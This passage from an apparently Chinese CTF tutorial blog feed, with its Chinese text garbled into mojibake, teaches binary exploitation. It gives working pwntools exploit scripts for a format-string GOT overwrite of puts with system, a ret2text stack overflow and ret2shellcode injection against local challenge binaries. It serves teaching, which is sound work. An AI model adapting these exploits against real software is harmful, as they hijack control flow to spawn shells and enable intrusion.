href="#è¦†ç›–putså‡½æ•°" class="headerlink" title="è¦†ç›–putså‡½æ•°"></a>è¦†ç›–putså‡½æ•°</h6><p>å‰é¢å·²ç»ç”¨è¿‡äº†puts_fileå’Œget_fileå‡½æ•°ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨show_dirå‡½æ•°<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212173601.png" alt="Pasted image 20250212173601"><br>åŸºæœ¬æ€è·¯æ˜¯è¿™æ ·çš„ï¼š<br>å›é¡¾ä¸€ä¸‹show_dirå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šå°†æˆ‘ä»¬è¾“å…¥çš„æ–‡ä»¶åå­˜æ”¾åœ¨å˜é‡sä¸­ï¼Œæœ€åä¼šä½œä¸ºputså‡½æ•°çš„å‚æ•°æ‰“å°å‡ºæ¥ã€‚<strong>é‚£ä¹ˆå¦‚æœå°†putså‡½æ•°æ›¿æ¢æˆsystemå‡½æ•°ï¼Œå¹¶ä¸”æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå«â€/bin/shâ€çš„æ–‡ä»¶åï¼Œé‚£ä¹ˆåŸæœ¬åº”è¯¥æ‰§è¡Œçš„æ˜¯puts(s)ï¼Œä½†å®é™…ä¸Šæ‰§è¡Œçš„å´æ˜¯system(â€œ/bin/shâ€)</strong><br>é‚£ä¹ˆè¦†ç›–çš„è¿‡ç¨‹ä¾ç„¶åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿›è¡Œè¦†ç›–ï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸‹pwntoolsä¸­çš„ä¸€ä¸ªå‡½æ•°<br><code>fmtstr_payload</code><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212181148.png" alt="Pasted image 20250212181148"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;puts_got:sys_addr&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>7:è·ç¦»æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»<br>puts_got:è¢«è¦†ç›–çš„åœ°å€<br>sys_addr:è¦†ç›–çš„åœ°å€</p></blockquote><h6 id="æ‰§è¡Œdirågetshell"><a href="#æ‰§è¡Œdirågetshell" class="headerlink" title="æ‰§è¡Œdirågetshell"></a>æ‰§è¡Œdirågetshell</h6><p>è¦†ç›–åè¾“å…¥dirè°ƒç”¨show_dirå‡½æ•°ï¼ŒåŸæœ¬çš„puts(â€œ/bin/sh;â€)å°±ä¼šè½¬è€Œæ‰§è¡Œsystem(â€œ/bin/sh;â€),ç„¶åå³å¯getshell</p><h5 id="å›é¡¾æ€è·¯"><a href="#å›é¡¾æ€è·¯" class="headerlink" title="å›é¡¾æ€è·¯"></a>å›é¡¾æ€è·¯</h5><p>è¾“å…¥å¯†ç â€”&gt;è¾“å…¥putåˆ›å»ºæ–‡ä»¶â€”&gt;è¾“å…¥æ–‡ä»¶åâ€/bin/sh;â€â€”&gt;è¾“å…¥æ–‡ä»¶å†…å®¹ï¼ˆè¦†ç›–çš„payload)-&gt;è¾“å…¥getæ‰“å°æ–‡ä»¶å†…å®¹â€”&gt;è¾“å…¥è¦æ‰“å°çš„æ–‡ä»¶åâ€/bin/sh;â€œæ‰§è¡Œè¦†ç›–</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span>   </span><br><span class="line">sh=process(<span class="string">&#x27;./pwn3&#x27;</span>)    </span><br><span class="line">pwn3=ELF(<span class="string">&#x27;./pwn3&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="comment">#ç™»å½•å¯†ç </span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;nism):&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;rxraclhm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got=pwn3.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sh.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;upload:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;Zechariah&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%8$s&#x27;</span>+p32(puts_got)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get the address of puts</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;get:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;Zechariah&#x27;</span>)</span><br><span class="line">put_addr= u32(sh.recv()[:<span class="number">4</span>])</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address=put_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#puts_got-&gt;system</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">7</span>,&#123;puts_got:sys_addr&#125;)</span><br><span class="line">sh.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;upload:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#åœ¨è¿è¡Œshow_diræ—¶å°†putså˜ä¸ºsystem</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#getæ‰§è¡Œprintfï¼Œä»¤payloadæ‰§è¡ŒæˆåŠŸ</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;ftp&gt;&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;get:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#é€šè¿‡dirå¼€shell</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><strong><em>getshell</em></strong><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212204303.png" alt="Pasted image 20250212204303"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNå…¥é—¨-åŸºæœ¬ROP</title>
      <link href="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/"/>
      <url>/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸºæœ¬ROP"><a href="#åŸºæœ¬ROP" class="headerlink" title="åŸºæœ¬ROP"></a>åŸºæœ¬ROP</h1><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨äº†è§£æ ˆæº¢å‡ºåï¼Œæˆ‘ä»¬å†ä»åŸç†å’Œæ–¹æ³•ä¸¤æ–¹é¢æ·±å…¥ç†è§£åŸºæœ¬ROP</p><h3 id="ä»€ä¹ˆæ˜¯ROP"><a href="#ä»€ä¹ˆæ˜¯ROP" class="headerlink" title="ä»€ä¹ˆæ˜¯ROP"></a>ä»€ä¹ˆæ˜¯ROP</h3><p>ROPçš„å…¨ç§°ä¸ºReturn-oriented programmingï¼ˆè¿”å›å¯¼å‘ç¼–ç¨‹ï¼‰ï¼Œè¿™æ˜¯ä¸€ç§é«˜çº§çš„å†…å­˜æ”»å‡»æŠ€æœ¯å¯ä»¥ç”¨æ¥ç»•è¿‡ç°ä»£æ“ä½œç³»ç»Ÿçš„å„ç§é€šç”¨é˜²å¾¡ï¼ˆæ¯”å¦‚å†…å­˜ä¸å¯æ‰§è¡Œå’Œä»£ç ç­¾åç­‰ï¼‰ã€‚<strong>é€šè¿‡ä¸Šä¸€ç¯‡æ–‡ç« æ ˆæº¢å‡ºæ¼æ´åŸç†è¯¦è§£ä¸åˆ©ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æ ˆæº¢å‡ºçš„æ§åˆ¶ç‚¹æ˜¯retå¤„</strong>ï¼Œ<em>é‚£ä¹ˆROPçš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯åˆ©ç”¨ä»¥retç»“å°¾çš„æŒ‡ä»¤åºåˆ—æŠŠæ ˆä¸­çš„åº”è¯¥è¿”å›EIPçš„åœ°å€æ›´æ”¹æˆæˆ‘ä»¬éœ€è¦çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</em></p><h3 id="ä¸ºä»€ä¹ˆè¦ROP"><a href="#ä¸ºä»€ä¹ˆè¦ROP" class="headerlink" title="ä¸ºä»€ä¹ˆè¦ROP"></a>ä¸ºä»€ä¹ˆè¦ROP</h3><p>æ¢ç©¶åŸå› ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ä»€ä¹ˆæ˜¯NX(DEP)ï¼Œ<em>NXå³No-execute(ä¸å¯æ‰§è¡Œ)çš„æ„æ€ï¼ŒNX(DEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</em><br><strong>éšç€NXä¿æŠ¤çš„å¼€å¯ï¼Œä»¥å¾€ç›´æ¥å‘æ ˆæˆ–è€…å †ä¸Šç›´æ¥æ³¨å…¥ä»£ç çš„æ–¹å¼éš¾ä»¥ç»§ç»­å‘æŒ¥æ•ˆæœã€‚</strong><br>æ‰€ä»¥å°±æœ‰äº†å„ç§ç»•è¿‡åŠæ³•ï¼Œropå°±æ˜¯ä¸€ç§ã€‚</p><p>ROP(Return Oriented Programming)ï¼Œ<strong><em>å…¶ä¸»è¦æ€æƒ³æ˜¯åœ¨æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µï¼ˆgadgets)æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</em></strong><br><em>æ‰€è°“gadgetså°±æ˜¯ä»¥retç»“å°¾çš„æŒ‡ä»¤åºåˆ—</em>ï¼Œé€šè¿‡è¿™äº›æŒ‡ä»¤åºåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æŸäº›åœ°å€çš„å†…å®¹ï¼Œæ–¹ä¾¿æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚ä¹‹æ‰€ä»¥ç§°ä¹‹ä¸ºROPï¼Œæ˜¯å› ä¸ºæ ¸å¿ƒåœ¨äºåˆ©ç”¨äº†æŒ‡ä»¤é›†ä¸­çš„retæŒ‡ä»¤ï¼Œæ”¹å˜äº†æŒ‡ä»¤æµçš„æ‰§è¡Œé¡ºåºã€‚<br><strong>ROPæ”»å‡»ä¸€èˆ¬å¾—æ»¡è¶³å¦‚ä¸‹æ¡ä»¶</strong></p><ul><li>ç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚</li><li>å¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„gadgetsä»¥åŠç›¸åº”gadgetsçš„åœ°å€ã€‚<br>å¦‚æœgadgetsæ¯æ¬¡çš„åœ°å€æ˜¯ä¸å›ºå®šçš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•åŠ¨æ€è·å–å¯¹åº”çš„åœ°å€ã€‚</li></ul><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a><strong>ret2text</strong></h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p><strong><em>ret2textå³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç (.text)</em></strong><br>å…¶å®ï¼Œè¿™ç§æ”»å‡»æ–¹æ³•æ˜¯ä¸€ç§ç¬¼ç»Ÿçš„æè¿°ã€‚æˆ‘ä»¬æ§åˆ¶æ‰§è¡Œç¨‹åºå·²æœ‰çš„ä»£ç çš„æ—¶å€™ä¹Ÿå¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œå¥½å‡ æ®µä¸ç›¸é‚»çš„ç¨‹åºå·²æœ‰çš„ä»£ç (ä¹Ÿå°±æ˜¯gadgets)ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ‰€è¦è¯´çš„ROPã€‚<br>è¿™æ—¶ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“å¯¹åº”è¿”å›çš„ä»£ç çš„ä½ç½®ã€‚å½“ç„¶ç¨‹åºä¹Ÿå¯èƒ½ä¼šå¼€å¯æŸäº›ä¿æŠ¤ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•å»ç»•è¿‡è¿™äº›ä¿æŠ¤ã€‚</p><blockquote><p><strong>é¡¾åæ€ä¹‰ï¼Œret2text(ret to text)ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„åˆ©ç”¨ç‚¹åœ¨åŸæ–‡ä»¶ä¸­å¯»æ‰¾ç›¸å¯¹åº”çš„ä»£ç å³å¯(è¿›ç¨‹å­˜åœ¨å±é™©å‡½æ•°å¦‚system(â€œ/binâ€)æˆ–execv(â€œ/bin/shâ€)çš„ç‰‡æ®µï¼Œå¯ä»¥ç›´æ¥åŠ«æŒè¿”å›åœ°å€åˆ°ç›®æ ‡å‡½æ•°åœ°å€ä¸Šã€‚ä»è€Œgetshellã€‚ï¼‰ï¼Œæ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç ï¼ˆ.text)</strong></p></blockquote><h3 id="åˆ©ç”¨å‰æ"><a href="#åˆ©ç”¨å‰æ" class="headerlink" title="åˆ©ç”¨å‰æ"></a>åˆ©ç”¨å‰æ</h3><p>å¼€å¯äº†NXï¼Œæ ˆä¸Šæ— æ³•å†™å…¥shellcode</p><blockquote><p><strong>shellcodeåŒ…å«system(â€œ/bin/shâ€)ç­‰ï¼Œå½“NXä¿æŠ¤å¼€å¯ï¼Œå°±è¡¨ç¤ºé¢˜ç›®ç»™äº†ä½ system(â€˜/bin/shâ€™ï¼‰ï¼Œå¦‚æœå…³é—­ï¼Œè¡¨ç¤ºä½ éœ€è¦è‡ªå·±å»æ„é€ shellcode</strong></p></blockquote><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">20</span>];</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥ä¸€ä¸‹æ–‡ä»¶ä¿æŠ¤<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122110045.png" alt="Pasted image 20250122110045">ä¿æŠ¤å…¨å…³<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122111413.png" alt="Pasted image 20250122111413"><br>rä»£è¡¨mainå‡½æ•°çš„æ ˆåº•ï¼Œç´§æ¥ç€å°±æ˜¯è¿”å›åœ°å€ï¼Œ<code>offset=0x8-(-0x20)=40</code><br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122110827.png" alt="Pasted image 20250122110827"><br>testå‡½æ•°,å³åé—¨å‡½æ•°åœ°å€ä¸º<code>0x401132</code><br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122111722.png" alt="Pasted image 20250122111722"><br>å†™ä»¥ä¸‹expï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">offset=<span class="number">40</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x401132</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>* offset + p64(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122123145.png" alt="Pasted image 20250122123145"><br>ç»“æœæœ¬åœ°æ‰“ä¸é€šï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯offsetæµ‹é‡é”™è¯¯ï¼Œäºæ˜¯å»å­¦ä¹ äº†æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦(cyclic)ï¼Œæ‰‹åŠ¨æµ‹å‡ºæ¥è¿˜æ˜¯40ï¼Œæœ€åçŒœæµ‹æ˜¯åœ°å€é—®é¢˜ï¼Œåœ¨idaä¸­æ‰¾åˆ°â€/bin/shâ€ï¼Œä¿®æ”¹addrä¸º<code>0x401136</code>ã€‚</p><p><em>æœ€åäº†è§£åˆ°ä½†å¦‚æœæ“ä½œç³»ç»Ÿæ˜¯ <strong>Ubuntu 18.04</strong> åŠä¹‹åçš„ç‰ˆæœ¬ï¼Œå°±ä¸å¾—ä¸è€ƒè™‘ <strong>æ ˆå¯¹é½</strong> çš„é—®é¢˜ã€‚</em></p><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122122225.png" alt="Pasted image 20250122122225"></p><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122123204.png" alt="Pasted image 20250122123204"><br><strong><em>æˆåŠŸgetshell</em></strong></p><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a><strong>ret2shellcode</strong></h2><h3 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h3><p><strong><em>ret2shellcodeï¼Œå³æ§åˆ¶ç¨‹åºæ‰§è¡Œ shellcode ä»£ç </em></strong>ã€‚<br><strong>ä¸€èˆ¬æ¥è¯´ï¼Œshellcode éœ€è¦æˆ‘ä»¬è‡ªå·±å¡«å……ã€‚è¿™å…¶å®æ˜¯å¦å¤–ä¸€ç§å…¸å‹çš„åˆ©ç”¨æ–¹æ³•ï¼Œå³æ­¤æ—¶æˆ‘ä»¬éœ€è¦è‡ªå·±å»å¡«å……ä¸€äº›å¯æ‰§è¡Œçš„ä»£ç ã€‚</strong></p><blockquote><p>å³ç¨‹åºä¸­æ²¡æœ‰ç±»ä¼¼äºsystem(â€œ/bin/sh)åé—¨å‡½æ•°ï¼Œéœ€è¦è‡ªå·±å¡«å……</p></blockquote><p>åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œè¦æƒ³æ‰§è¡Œ shellcodeï¼Œéœ€è¦å¯¹åº”çš„ binary åœ¨è¿è¡Œæ—¶ï¼Œshellcode æ‰€åœ¨çš„åŒºåŸŸå…·æœ‰å¯æ‰§è¡Œæƒé™ã€‚</p><h3 id="åˆ©ç”¨å…³é”®"><a href="#åˆ©ç”¨å…³é”®" class="headerlink" title="åˆ©ç”¨å…³é”®"></a>åˆ©ç”¨å…³é”®</h3><ul><li>ç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”è¿˜è¦èƒ½å¤Ÿæ§åˆ¶è¿”å›åœ°å€</li><li>ç¨‹åºè¿è¡Œæ—¶ï¼Œshellcodeæ‰€åœ¨çš„åŒºåŸŸè¦æ‹¥æœ‰æ‰§è¡Œæƒé™(NXä¿æŠ¤å…³é—­ï¼Œbssæ®µå¯æ‰§è¡Œ)</li><li>æ“ä½œç³»ç»Ÿè¿˜éœ€è¦å…³é—­ASLR(åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–)ä¿æŠ¤ã€‚(æˆ–å…³é—­PIEä¿æŠ¤)</li></ul><h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><ul><li>å…ˆä½¿ç”¨cyclicæµ‹è¯•æº¢å‡ºç‚¹ï¼Œæ„é€ åˆæ­¥çš„payload</li><li>ç¡®å®šç¨‹åºä¸­çš„æº¢å‡ºä½ï¼Œçœ‹æ˜¯å¦å¯åœ¨bssæ®µä¼ å…¥æ•°æ®</li><li>ä½¿ç”¨GDBçš„<code>vmmap</code>æŸ¥çœ‹<code>bssæ®µ</code></li><li>å†å°†ç¨‹åºæº¢å‡ºåˆ°ä¸Šä¸€æ­¥ç”¨æˆ·æäº¤çš„å˜é‡çš„åœ°å€</li></ul><h3 id="ç¤ºä¾‹-1"><a href="#ç¤ºä¾‹-1" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example">ctf-challenges/pwn/stackoverflow/ret2shellcode/ret2shellcode-example at master Â· ctf-wiki/ctf-challenges</a><br>è¿è¡Œ<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123130739.png" alt="Pasted image 20250123130739"><br>checksec<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123130542.png" alt="Pasted image 20250123130542"><br>IDAæ‰“å¼€<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123130924.png" alt="Pasted image 20250123130924"><br>å¯ä»¥çœ‹åˆ°ï¼Œæ— åé—¨å‡½æ•°ä¸”å­˜åœ¨åŸºæœ¬çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œä¸”å°†å¯¹åº”å­—ç¬¦ä¸²å¤åˆ¶åˆ°buf2å¤„</p><blockquote><p>å¯ç”¨<code>readelf -S æ–‡ä»¶å</code>æä¾›ç¨‹åºä¸­å„æ®µçš„åœ°å€èŒƒå›´<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123131052.png" alt="Pasted image 20250123131052"><br>buf2åœ¨bssæ®µï¼ŒåŠ¨è°ƒçœ‹è¯¥bssæ®µæ˜¯å¦å¯æ‰§è¡Œ<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123131416.png" alt="Pasted image 20250123131416"><br>bssæ®µåœ¨ä»¥ä¸‹èŒƒå›´ï¼Œæ— å¯æ‰§è¡Œæƒé™(ubuntu24)<br><code>0x804a000  0x804b000 rw-p     1000   1000 /home/zechariah/æ¡Œé¢/pwn_learn/ret2shellcode</code></p></blockquote><p>åœ¨è¾ƒä½ç‰ˆæœ¬çš„kaliæˆ–linuxä¸­,åˆ™æ˜¯<br><code>rwxp</code>ï¼Œå…·æœ‰å¯æ‰§è¡Œæƒé™<br>æ¥ç€ç”¨cyclicè®¡ç®—åç§»ä¸º112<br>å¾—åˆ°å¦‚ä¸‹exp<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh()) <span class="comment">#ç”Ÿæˆå¹¶æ±‡ç¼–shellcode</span></span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><br>æ³¨æ„ä¸€ä¸‹payload: <code>shellcode.ljust(112, &#39;A&#39;) + p32(buf2_addr)</code><br>é¦–å…ˆæˆ‘ä»¬å°†payloadè¾“å…¥åˆ°å˜é‡sä¹Ÿå°±æ˜¯æ ˆä¸Šï¼Œç„¶åå°†mainå‡½æ•°çš„è¿”å›åœ°å€è¦†ç›–ä¸ºbuf2_addrï¼ˆ<em>éœ€è¦æ­¤bssæ®µå¯æ‰§è¡Œ</em>)ï¼Œä¹‹åmainå‡½æ•°æ‰§è¡Œstrncpy(buf2,&amp;s,100u);ï¼ˆè™½ç„¶shellcodeè¢«æˆªæ–­ä¸º100ï¼Œä½†æ˜¯è¢«æˆªæ–­çš„å†…å®¹åªæ˜¯Aï¼Œå¹¶ä¸å½±å“shellcodeçš„å®Œæ•´åº¦ï¼‰ï¼Œå°†å†…å®¹å¤åˆ¶åˆ°äº†buf2ï¼Œ<strong>ç”±äºmainå‡½æ•°çš„è¿”å›åœ°å€è¢«è¦†ç›–ä¸ºshellcodeçš„åœ°å€ï¼Œå› æ­¤åœ¨mainå‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹åï¼ŒElPè½¬å‘æ‰§è¡Œshellcode</strong></p><p><strong><em>bssæ®µå¯æ‰§è¡Œæ—¶ï¼Œå¯æˆåŠŸgetshell</em></strong></p><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a><strong>ret2syscall</strong></h2><h3 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p><strong><em>ret to syscallï¼Œå°±æ˜¯è°ƒç”¨ç³»ç»Ÿå‡½æ•°ä»¥è¾¾åˆ°getshellçš„ç›®çš„</em></strong><br>åœ¨è®¡ç®—ä¸­ï¼Œç³»ç»Ÿè°ƒç”¨æ˜¯ä¸€ç§ç¼–ç¨‹æ–¹å¼ï¼Œè®¡ç®—æœºç¨‹åºä»è¯¥ç¨‹åºä¸­å‘æ‰§è¡Œå…¶çš„æ“ä½œç³»ç»Ÿå†…æ ¸è¯·æ±‚æœåŠ¡ã€‚è¿™å¯èƒ½åŒ…æ‹¬ä¸ç¡¬ä»¶ç›¸å…³çš„æœåŠ¡ï¼ˆä¾‹å¦‚ï¼Œè®¿é—®ç¡¬ç›˜é©±åŠ¨å™¨ï¼‰ï¼Œåˆ›å»ºå’Œæ‰§è¡Œæ–°è¿›ç¨‹ä»¥åŠä¸è¯¸å¦‚è¿›ç¨‹è°ƒåº¦ä¹‹ç±»çš„é›†æˆå†…æ 